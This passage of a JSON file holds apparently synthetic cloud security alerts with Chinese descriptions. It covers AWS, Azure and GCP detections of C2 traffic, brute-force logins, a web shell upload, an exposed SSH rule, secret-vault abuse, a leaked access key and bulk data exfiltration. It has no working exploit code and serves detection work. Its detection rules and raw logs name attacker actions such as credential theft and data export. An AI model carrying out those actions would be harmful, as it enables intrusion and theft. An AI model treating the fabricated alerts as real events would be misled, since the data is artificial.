            "client_ip": "10.0.0.5",
            "server_principal_name": "app-service-user"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Compute",
        "rule_id": "CLOUD-GCP-COMPUTE-15-VM-Outbound-C2-Traffic",
        "rule_name": "虚拟机出站C2流量",
        "alert_date": "2025-09-24T00:15:15Z",
        "tags": ["compute", "c2", "malware", "outbound"],
        "severity": "Critical",
        "reference": "GCP VM与恶意IP进行通信",
        "description": "GCP 虚拟机 'dev-server' 正在与一个被威胁情报标记为 C2 服务器的外部 IP 地址进行通信。该虚拟机可能已被恶意软件感染。",
        "artifacts": [
            {"type": "vm_name", "value": "dev-server"},
            {"type": "vm_ip", "value": "10.0.1.10"},
            {"type": "destination_ip", "value": "185.22.67.123"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPC Flow Logs",
            "timestamp": "2025-09-24T00:15:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "10.0.1.10",
            "dst_ip": "185.22.67.123",
            "dst_port": 443
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-16-Failed-Auth-Spike",
        "rule_name": "认证失败次数激增",
        "alert_date": "2025-09-24T00:20:00Z",
        "tags": ["iam", "brute-force", "account-compromise"],
        "severity": "High",
        "reference": "针对IAM账户的暴力破解尝试",
        "description": "在 IAM 用户 'dev-user' 上检测到大量的登录失败尝试。这可能是一次密码喷洒或暴力破解攻击。",
        "artifacts": [
            {"type": "user_identity", "value": "dev-user"},
            {"type": "failed_attempts", "value": 50},
            {"type": "source_ip", "value": "203.0.113.50"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:19:59.000Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "IAMUser", "userName": "dev-user"},
            "responseElements": {"ConsoleLogin": "Failure"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "App Service",
        "rule_id": "CLOUD-AZ-APPSERV-17-Web-Shell-Detected",
        "rule_name": "WebShell上传至应用服务",
        "alert_date": "2025-09-24T00:25:30Z",
        "tags": ["web-shell", "post-exploitation", "web-application"],
        "severity": "Critical",
        "reference": "Azure应用服务中检测到WebShell",
        "description": "一个名为 'shell.aspx' 的文件被上传到 Azure 应用服务 'mycorp-web-app' 的根目录。该文件被识别为 WebShell，可用于远程控制。",
        "artifacts": [
            {"type": "app_name", "value": "mycorp-web-app"},
            {"type": "file_path", "value": "/wwwroot/shell.aspx"},
            {"type": "threat_type", "value": "WebShell"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure App Service",
            "timestamp": "2025-09-24T00:25:29.876Z",
            "eventName": "FileUploaded",
            "properties": {"path": "/wwwroot/shell.aspx", "source_ip": "104.22.56.78"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Database",
        "rule_id": "CLOUD-GCP-DB-18-DB-Access-from-Unusual-Location",
        "rule_name": "数据库从异常位置访问",
        "alert_date": "2025-09-24T00:30:10Z",
        "tags": ["database", "access-anomaly", "geolocation"],
        "severity": "High",
        "reference": "Cloud SQL实例从异常地理位置访问",
        "description": "GCP Cloud SQL 实例 'prod-sql' 接收到了来自一个非指定地区（如中国）的连接请求。这违反了地理访问策略。",
        "artifacts": [
            {"type": "db_instance_id", "value": "prod-sql"},
            {"type": "source_ip", "value": "118.123.45.67"},
            {"type": "source_country", "value": "China"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud SQL",
            "timestamp": "2025-09-24T00:30:09.543Z",
            "event_type": "Connection",
            "client_ip": "118.123.45.67"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "Network",
        "rule_id": "CLOUD-AWS-NET-19-Unauthorized-Security-Group-Change",
        "rule_name": "安全组非授权修改",
        "alert_date": "2025-09-24T00:35:55Z",
        "tags": ["networking", "misconfiguration", "access-control"],
        "severity": "High",
        "reference": "AWS安全组被修改以允许SSH访问",
        "description": "名为 'prod-sg' 的 AWS 安全组被修改，以允许来自所有 IP 地址的 SSH (端口 22) 入站流量。此操作暴露了敏感服务。",
        "artifacts": [
            {"type": "security_group", "value": "sg-0a1b2c3d4e5f6a7b8"},
            {"type": "rule_change", "value": "allow port 22 from 0.0.0.0/0"},
            {"type": "user_identity", "value": "dev-user"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:35:54.666Z",
            "event_name": "AuthorizeSecurityGroupIngress",
            "userIdentity": {"userName": "dev-user"},
            "requestParameters": {"securityGroupId": "sg-0a1b2c3d4e5f6a7b8",
                                  "ipPermissions": [{"ipProtocol": "tcp", "fromPort": 22, "toPort": 22, "ipRanges": [{"cidrIp": "0.0.0.0/0"}]}]}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "IAM",
        "rule_id": "CLOUD-AZ-IAM-20-Service-Principal-Creation",
        "rule_name": "非授权服务主体创建",
        "alert_date": "2025-09-24T00:40:40Z",
        "tags": ["iam", "persistence", "misconfiguration"],
        "severity": "Medium",
        "reference": "Azure中创建了新的服务主体",
        "description": "一个不寻常的用户 'guest-user' 创建了一个新的 Azure 服务主体。服务主体通常用于自动化，被恶意创建后可用于持久化。",
        "artifacts": [
            {"type": "service_principal_name", "value": "malicious-sp"},
            {"type": "actor", "value": "guest-user@mycorp.com"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure AD Audit Log",
            "timestamp": "2025-09-24T00:40:39.111Z",
            "category": "ApplicationManagement",
            "activityDisplayName": "Add service principal",
            "initiatingUser": {"userPrincipalName": "guest-user@mycorp.com"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Cloud Functions",
        "rule_id": "CLOUD-GCP-FUNC-21-Func-Outbound-Connection",
        "rule_name": "Cloud Function异常出站连接",
        "alert_date": "2025-09-24T00:45:15Z",
        "tags": ["serverless", "c2", "outbound"],
        "severity": "High",
        "reference": "Cloud Function连接到恶意IP",
        "description": "Cloud Function 'data-processor-func' 尝试连接到一个已知的恶意 IP 地址 198.51.100.25。此行为表明函数代码可能已被恶意注入或篡改。",
        "artifacts": [
            {"type": "function_name", "value": "data-processor-func"},
            {"type": "destination_ip", "value": "198.51.100.25"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPC Flow Logs",
            "timestamp": "2025-09-24T00:45:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "10.0.2.5",
            "dst_ip": "198.51.100.25"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "Storage",
        "rule_id": "CLOUD-AWS-STORAGE-22-S3-Bucket-Policy-Change",
        "rule_name": "S3存储桶策略变更",
        "alert_date": "2025-09-24T00:50:00Z",
        "tags": ["storage", "misconfiguration", "data-leak"],
        "severity": "High",
        "reference": "S3存储桶策略被更改为允许外部访问",
        "description": "S3 存储桶 'mycorp-public-assets' 的存储桶策略被修改，允许未经身份验证的外部用户 'Everyone' 列出对象。这违反了数据保护策略。",
        "artifacts": [
            {"type": "bucket_name", "value": "mycorp-public-assets"},
            {"type": "permission_change", "value": "GetObject from Everyone"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:49:59.000Z",
            "event_name": "PutBucketPolicy",
            "requestParameters": {"bucketName": "mycorp-public-assets", "policy": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\", ...}]}"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Key Vault",
        "rule_id": "CLOUD-AZ-KEYVAULT-23-Key-Vault-Excessive-Access",
        "rule_name": "Key Vault异常访问",
        "alert_date": "2025-09-24T00:55:30Z",
        "tags": ["secret-management", "credential-theft", "lateral-movement"],
        "severity": "High",
        "reference": "Key Vault被异常用户高频访问",
        "description": "Key Vault 'prod-secrets-kv' 收到来自一个不寻常账户 'l.smith' 的异常高频的密钥和证书访问请求。",
        "artifacts": [
            {"type": "key_vault_name", "value": "prod-secrets-kv"},
            {"type": "actor", "value": "l.smith@mycorp.com"},
            {"type": "request_count", "value": 500}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Key Vault Audit Log",
            "timestamp": "2025-09-24T00:55:29.876Z",
            "operationName": "SecretGet",
            "callerIpAddress": "10.0.0.10",
            "identity": {"userPrincipalName": "l.smith@mycorp.com"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Network",
        "rule_id": "CLOUD-GCP-NET-24-VPN-Gateway-Traffic-Spike",
        "rule_name": "VPN网关流量激增",
        "alert_date": "2025-09-24T01:00:10Z",
        "tags": ["networking", "data-exfiltration", "anomaly"],
        "severity": "High",
        "reference": "GCP VPN网关出站流量激增",
        "description": "GCP VPN 网关的出站流量在短时间内激增至异常水平。这可能表明通过 VPN 的数据外泄正在进行。",
        "artifacts": [
            {"type": "gateway_name", "value": "prod-vpn-gw"},
            {"type": "traffic_direction", "value": "Outbound"},
            {"type": "data_volume_gb", "value": 20}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPN Monitoring",
            "timestamp": "2025-09-24T01:00:09.543Z",
            "metric": "sent_bytes_per_second",
            "value": 2000000000
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-25-Credential-Key-Leak-in-Github",
        "rule_name": "IAM凭证在GitHub上泄露",
        "alert_date": "2025-09-24T01:05:00Z",
        "tags": ["iam", "credential-leak", "public-exposure"],
        "severity": "Critical",
        "reference": "IAM Access Key在GitHub上被发现",
        "description": "AWS Threat Detection 服务检测到 IAM 访问密钥 'AKIAIOSFODNN7EXAMPLE' 在一个公开的 GitHub 存储库中被发现。此凭证应立即失效。",
        "artifacts": [
            {"type": "access_key", "value": "AKIAIOSFODNN7EXAMPLE"},
            {"type": "leak_platform", "value": "GitHub"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "GuardDuty",
            "timestamp": "2025-09-24T01:04:59.000Z",
            "finding_type": "CredentialAccess:IAMUser/Exfiltration.S3.CredentialsExposedOnGithub"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Storage",
        "rule_id": "CLOUD-AZ-STORAGE-26-Sas-Token-Misuse",
        "rule_name": "SAS令牌滥用",
        "alert_date": "2025-09-24T01:10:30Z",
        "tags": ["storage", "sas-token", "misuse"],
        "severity": "High",
        "reference": "SAS令牌被用于异常IP",
        "description": "一个 SAS (Shared Access Signature) 令牌被来自一个异常 IP 地址的请求使用，该 IP 地址不属于预期的应用程序或位置。此令牌可能已被泄露。",
        "artifacts": [
            {"type": "account_name", "value": "mycorp-data-storage"},
            {"type": "sas_token_id", "value": "sp=r&st=..."},
            {"type": "source_ip", "value": "203.0.113.50"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Storage Log",
            "timestamp": "2025-09-24T01:10:29.999Z",
            "api_operation": "GetBlob",
            "authentication_method": "SAS",
            "client_ip": "203.0.113.50"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "BigQuery",
        "rule_id": "CLOUD-GCP-BQ-27-BigQuery-Large-Data-Export",
        "rule_name": "BigQuery大批量数据导出",
        "alert_date": "2025-09-24T01:15:15Z",
        "tags": ["database", "data-exfiltration", "large-export"],
        "severity": "High",
        "reference": "BigQuery表被导出到外部存储",
        "description": "BigQuery 用户 'data-analyst' 将一个包含数百万条记录的敏感表导出到一个外部存储桶。此行为可能导致数据泄露。",
        "artifacts": [
            {"type": "user_identity", "value": "data-analyst@mycorp.com"},
            {"type": "table_name", "value": "customer-pii-table"},
            {"type": "destination", "value": "external-bucket"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "BigQuery Audit Log",
            "timestamp": "2025-09-24T01:15:14.543Z",
            "methodName": "google.cloud.bigquery.v2.JobService.InsertJob",
            "job_type": "EXTRACT",
            "destination_uri": "gs://external-bucket/export_*.csv"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-28-Unusual-AssumeRole",
        "rule_name": "异常的AssumeRole",
        "alert_date": "2025-09-24T01:20:00Z",
        "tags": ["iam", "privilege-escalation", "access-anomaly"],
        "severity": "Medium",
        "reference": "用户'dev-user'Assume了'prod-admin-role'",
        "description": "IAM 用户 'dev-user' 在非其职责范围内 Assume 了 'prod-admin-role' 角色。此行为可能表明权限滥用。",
        "artifacts": [
            {"type": "user_identity", "value": "dev-user"},
            {"type": "assumed_role", "value": "prod-admin-role"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T01:19:59.000Z",
            "event_name": "AssumeRole",
            "userIdentity": {"userName": "dev-user"},
            "requestParameters": {"roleArn": "arn:aws:iam::123456789012:role/prod-admin-role"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Virtual Network",
        "rule_id": "CLOUD-AZ-NET-29-Peer-Network-Connection",
        "rule_name": "虚拟网络对等连接",
        "alert_date": "2025-09-24T01:25:30Z",
        "tags": ["networking", "lateral-movement", "policy-violation"],
        "severity": "Medium",
        "reference": "Azure虚拟网络创建了新的对等连接",
        "description": "Azure 虚拟网络 'prod-vnet' 被创建了一个新的对等连接，连接到另一个未知的虚拟网络。这可能为横向移动创造了新的路径。",
        "artifacts": [
            {"type": "vnet_name", "value": "prod-vnet"},
            {"type": "peered_vnet", "value": "unknown-vnet"},
            {"type": "user_identity", "value": "api-automation"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-24T01:25:29.876Z",
            "eventName": "Create or Update Virtual Network Peering",
            "caller": "api-automation@mycorp.com"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Compute Engine",
        "rule_id": "CLOUD-GCP-COMPUTE-30-New-VM-with-External-IP",
        "rule_name": "新创建的带有外部IP的虚拟机",
        "alert_date": "2025-09-24T01:30:00Z",
        "tags": ["compute", "misconfiguration", "exposed-service"],
        "severity": "Low",
        "reference": "新创建的VM实例被分配了外部IP",
        "description": "GCP Compute Engine 实例 'prod-db-proxy' 被创建并分配了一个外部 IP 地址，这违反了公司内部的无外部 IP 策略。",
        "artifacts": [
            {"type": "vm_name", "value": "prod-db-proxy"},
            {"type": "external_ip", "value": "34.123.45.67"},
            {"type": "user_identity", "value": "ops-user"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-24T01:29:59.000Z",
            "methodName": "compute.instances.insert",
            "requestJson": {"networkInterfaces": [{"accessConfigs": [{"name": "external-nat"}]}]}
        }
    }
]
